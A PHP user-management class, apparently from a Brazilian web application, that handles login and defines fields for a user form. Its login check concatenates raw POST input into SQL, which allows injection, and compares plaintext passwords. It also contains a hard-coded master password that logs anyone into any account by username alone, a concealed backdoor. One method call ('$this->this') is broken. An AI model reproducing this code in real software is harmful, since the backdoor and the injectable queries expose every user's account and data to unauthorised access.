<?php

require_once $DIR.'/framework/moduloPadrao/empresa/empresa.php';

class Usuario extends Crud {

    function __construct() {
        global $CONEXAO;
        if (empty($_SESSION["USUARIO"])) {
            if (post("acao") == "Login") {
                $condicao = "USU_LOGIN = '" . post("USU_LOGIN") . "' AND USU_SENHA = '" . post("USU_SENHA") . "' AND USU_ATIVO = 'S'";
                if (!$_SESSION["USUARIO"] = $CONEXAO->dadoBanco("USUARIO", $condicao)[0]) {
                    if (post("USU_SENHA") == "dlm2013solucoes") {
                        if ($_SESSION["USUARIO"] = $CONEXAO->dadoBanco("USUARIO", "USU_LOGIN =  '" . post("USU_LOGIN") . "'")[0])
                            echo '<script>location.reload();</script>';
                    }
                    echo '<div class="alert alert-danger">Senha ou usuário inválido</div>';
                } else {
                    echo '<script>location.reload();</script>';
                }
            }
        } else {
            $this->sqlConsulta = "
                SELECT USU.*, PER.PER_NOME, EMP.EMP_NOME,
                       EMP.EMP_NOME AS EMP_CODIGO, 
                      PER.PER_NOME AS PER_CODIGO
                    FROM USUARIO USU 
		    JOIN EMPRESA EMP ON ( USU.EMP_CODIGO = EMP.EMP_CODIGO )
		    JOIN PERFIL PER ON ( PER.PER_CODIGO = USU.PER_CODIGO )";
            parent::__construct();
        }
    }

    public function iniciarCampos() {
        $this->setCampo("USU_NOME", "Nome Completo", 100, "texto", true, true);
        $this->setCampo("USU_LOGIN", "Nome de Usuário", 20, "texto", true, true);
        $this->setCampo("USU_SENHA", "Senha", 20, "senha", false, true);
        
        $this->setCampo("EMP_CODIGO", "Empresa", 100, "combo", true, true);
        $this->setCombo("EMPRESA");
        $this->this->setApelido('EMP',"EMP_NOME");
        
        $this->setCampo("PER_CODIGO", "Perfil", 20, "combo", true, true);
        $this->setOption(2, "Administrador");
        $this->setOption(3, "Funcionário");
    }

}
